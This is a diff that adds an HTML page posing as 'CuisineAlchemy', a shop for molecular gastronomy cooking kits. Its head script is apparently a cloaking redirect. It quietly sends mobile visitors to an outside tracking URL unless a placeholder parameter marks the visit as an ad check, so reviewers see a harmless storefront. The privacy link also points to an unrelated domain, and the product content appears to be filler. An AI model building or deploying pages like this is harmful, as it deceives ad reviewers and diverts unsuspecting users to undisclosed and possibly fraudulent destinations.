@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CuisineAlchemy: Molecular Gastronomy Cooking Kits</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;700&family=Playfair+Display:wght@400;700&display=swap');
+        
+        :root {
+            --primary-color: #6A1B9A;
+            --secondary-color: #00BCD4;
+            --background-color: #F3E5F5;
+            --text-color: #333333;
+        }
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background: linear-gradient(135deg, #6A1B9A, #8E24AA);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 40px;
+        }
+        .kit-card {
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        .kit-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+        }
+        .kit-image {
+            height: 200px;
+            background-color: #E1BEE7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: #6A1B9A;
+            position: relative;
+            overflow: hidden;
+        }
+        .kit-image::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle, transparent 30%, #E1BEE7 150%);
+            opacity: 0.7;
+        }
+        .kit-info {
+            padding: 20px;
+        }
+        h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 3.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        h2 {
+            font-family: 'Playfair Display', serif;
+            color: #6A1B9A;
+            margin-top: 0;
+            font-size: 1.8em;
+        }
+        p {
+            color: #555555;
+            line-height: 1.6;
+        }
+        .skill-level {
+            font-weight: bold;
+            color: #00BCD4;
+            font-size: 0.9em;
+            margin-top: 15px;
+        }
+        .kit-type {
+            background-color: #6A1B9A;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .buy-button {
+            background-color: #00BCD4;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 15px;
+            font-size: 1em;
+            font-weight: bold;
+            font-family: 'Montserrat', sans-serif;
+        }
+        .buy-button:hover {
+            background-color: #00ACC1;
+            transform: scale(1.05);
+        }
+        footer {
+            background: linear-gradient(135deg, #8E24AA, #6A1B9A);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #E1BEE7;
+            padding: 15px 0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 20px;
+        }
+        nav a {
+            color: #6A1B9A;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+            font-family: 'Montserrat', sans-serif;
+        }
+        nav a:hover {
+            color: #00BCD4;
+        }
+        footer a {
+            color: white;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>CuisineAlchemy</h1>
+        <p>Transform Your Kitchen into a Culinary Laboratory</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Our Kits</a></li>
+            <li><a href="#">Recipes</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="kit-card">
+            <div class="kit-image">Spherification Kit</div>
+            <div class="kit-info">
+                <h2>Spherification Starter Kit</h2>
+                <p>Create edible spheres with liquid centers, perfect for appetizers and garnishes.</p>
+                <span class="kit-type">Textures</span>
+                <p class="skill-level">Skill Level: Beginner</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+        <div class="kit-card">
+            <div class="kit-image">Foam Kit</div>
+            <div class="kit-info">
+                <h2>Culinary Foam Essentials</h2>
+                <p>Explore the world of flavored foams to add a light, airy texture to your dishes.</p>
+                <span class="kit-type">Aeration</span>
+                <p class="skill-level">Skill Level: Intermediate</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+        <div class="kit-card">
+            <div class="kit-image">Gelification Kit</div>
+            <div class="kit-info">
+                <h2>Advanced Gelification Set</h2>
+                <p>Master the art of creating unique gels and jellies with various textures.</p>
+                <span class="kit-type">Textures</span>
+                <p class="skill-level">Skill Level: Advanced</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+        <div class="kit-card">
+            <div class="kit-image">Sous Vide Kit</div>
+            <div class="kit-info">
+                <h2>Precision Sous Vide Cooking</h2>
+                <p>Achieve perfect doneness and texture with this sous vide immersion circulator kit.</p>
+                <span class="kit-type">Temperature Control</span>
+                <p class="skill-level">Skill Level: All Levels</p>
+                <button class="buy-button">Add to Cart</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 CuisineAlchemy Molecular Gastronomy Kits. Redefining the art of cooking.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
